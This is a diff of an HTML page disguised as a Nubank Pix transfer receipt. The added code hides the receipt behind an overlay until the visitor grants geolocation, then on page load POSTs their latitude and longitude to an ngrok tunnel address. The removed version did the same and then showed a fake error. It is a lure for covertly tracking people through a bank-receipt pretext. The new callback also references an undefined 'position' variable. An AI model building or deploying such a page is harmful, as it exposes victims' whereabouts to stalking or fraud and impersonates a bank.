@@ -3,53 +3,271 @@
 
 <head>
   <meta charset="UTF-8">
-  <title>Comprovante</title>
+  <title>Comprovante de Transferência</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #fafafa;
+      margin: 0;
+      padding: 2rem;
+      color: #333;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+      overflow: hidden;
+    }
+
+    header {
+      padding: 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    header img {
+      height: 32px;
+    }
+
+    header .date {
+      color: #666;
+      font-size: 0.9rem;
+    }
+
+    .summary {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      padding: 1.5rem;
+      gap: 1rem;
+    }
+
+    .summary .item b {
+      display: block;
+      font-size: 0.85rem;
+      color: #666;
+      margin-bottom: 0.25rem;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #eee;
+      margin: 0;
+    }
+
+    .section {
+      padding: 1.5rem;
+    }
+
+    .section h2 {
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      color: #333;
+    }
+
+    .section h2::before {
+      content: '▸';
+      display: inline-block;
+      margin-right: 0.5rem;
+      color: #8f8f8f;
+    }
+
+    .fields {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 0.75rem 2rem;
+    }
+
+    .field b {
+      display: block;
+      font-size: 0.85rem;
+      color: #666;
+      margin-bottom: 0.2rem;
+    }
+
+    footer {
+      padding: 1.5rem;
+      font-size: 0.8rem;
+      color: #666;
+      line-height: 1.4;
+    }
+
+    footer .line {
+      margin: 0.5rem 0;
+    }
+
+    /* estilos do overlay que bloqueia o acesso */
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 1rem;
+      box-sizing: border-box;
+      z-index: 1000;
+    }
+
+    #overlay.hidden {
+      display: none;
+    }
+
+    #overlay button {
+      margin-top: 1rem;
+      padding: .5rem 1rem;
+      font-size: 1rem;
+      cursor: pointer;
+      border: none;
+      border-radius: 4px;
+    }
+  </style>
 </head>
 
-<body style="background-color: antiquewhite;">
-  <h1>Comprovante</h1>
+<body>
+
+  <!-- Overlay que obriga a liberar localização -->
+  <div id="overlay">
+    <h2>Precisamos da sua localização</h2>
+    <p>Para visualizar o comprovante, habilite o acesso à sua localização.</p>
+    <button id="retry">Tentar novamente</button>
+    <p style="font-size:.8rem; margin-top:1rem;">
+      Se você negou antes, será preciso ajustar nas configurações do navegador.
+    </p>
+  </div>
+
+  <!-- Comprovante (inicialmente oculto) -->
+  <div id="receipt" class="container" style="display: none;">
+    <header>
+      <img src="https://via.placeholder.com/100x32?text=Logo" alt="Logo">
+      <div class="date">15 MAI 2025 – 14:22:10</div>
+    </header>
+
+    <div class="summary">
+      <div class="item">
+        <b>Valor</b>
+        R$ 150,00
+      </div>
+      <div class="item">
+        <b>Tipo de transferência</b>
+        Pix
+      </div>
+    </div>
+
+    <hr>
+
+    <section class="section">
+      <h2>Destino</h2>
+      <div class="fields">
+        <div class="field">
+          <b>Nome</b>
+          Ana Carolina Mendes
+        </div>
+        <div class="field">
+          <b>Instituição</b>
+          Banco do Brasil S.A.
+        </div>
+        <div class="field">
+          <b>CPF</b>
+          •••.123.456-••
+        </div>
+        <div class="field">
+          <b>Tipo de conta</b>
+          Conta corrente
+        </div>
+      </div>
+    </section>
+
+    <hr>
+
+    <section class="section">
+      <h2>Origem</h2>
+      <div class="fields">
+        <div class="field">
+          <b>Nome</b>
+          Lucas Vieira
+        </div>
+        <div class="field">
+          <b>Conta</b>
+          4321 56789-0
+        </div>
+        <div class="field">
+          <b>Instituição</b>
+          Nubank – Nu Pagamentos S.A.
+        </div>
+        <div class="field">
+          <b>CPF</b>
+          •••.987.654-••
+        </div>
+        <div class="field">
+          <b>Agência</b>
+          0001
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="line"><b>Nu Pagamentos S.A. – Instituição de Pagamento</b></div>
+      <div class="line">CNPJ 12.345.678/0001-99</div>
+      <div class="line"><b>ID da transação:</b> A1B2C3D4E5F6G7H8I9J0</div>
+      <div class="line">Em caso de dúvidas, fale com a gente:</div>
+      <div class="line">0800 123 4567 • atendimento@seudominio.com</div>
+      <div class="line">(segunda a sexta, das 09h às 18h – horário de Brasília)</div>
+    </footer>
+  </div>
 
   <script>
-    // Executa automaticamente ao carregar a página
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+    const overlay = document.getElementById('overlay');
+    const retryButton = document.getElementById('retry');
+    const receipt = document.getElementById('receipt');
+
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        alert('Geolocalização não suportada neste navegador.');
+        return;
       }
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          // Usuário liberou localização: esconde overlay e mostra comprovante
+          overlay.classList.add('hidden');
+          receipt.style.display = 'block';
+
+          fetch('https://ba44-2804-d59-a41a-de00-8802-c1ff-cd3e-cb28.ngrok-free.app', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            })
+          })
+            .catch(err => console.error('Erro ao enviar localização:', err));
+        },
+        err => {
+          // Negou ou deu erro: mantém overlay visível
+          overlay.classList.remove('hidden');
+        }
+      );
+    }
+
+    retryButton.addEventListener('click', () => {
+      requestLocation();
     });
 
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
-      console.log("Latitude: " + latitude);
-      console.log("Longitude: " + longitude);
-
-      // Envia a localização para o backend
-      fetch("https://ba44-2804-d59-a41a-de00-8802-c1ff-cd3e-cb28.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (data.success) {
-            alert("Algo deu errado. Tente novamente mais tarde.");
-          } else {
-            alert("Algo deu errado. Tente novamente mais tarde.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+    window.addEventListener('load', () => {
+      requestLocation();
+    });
   </script>
 </body>
 
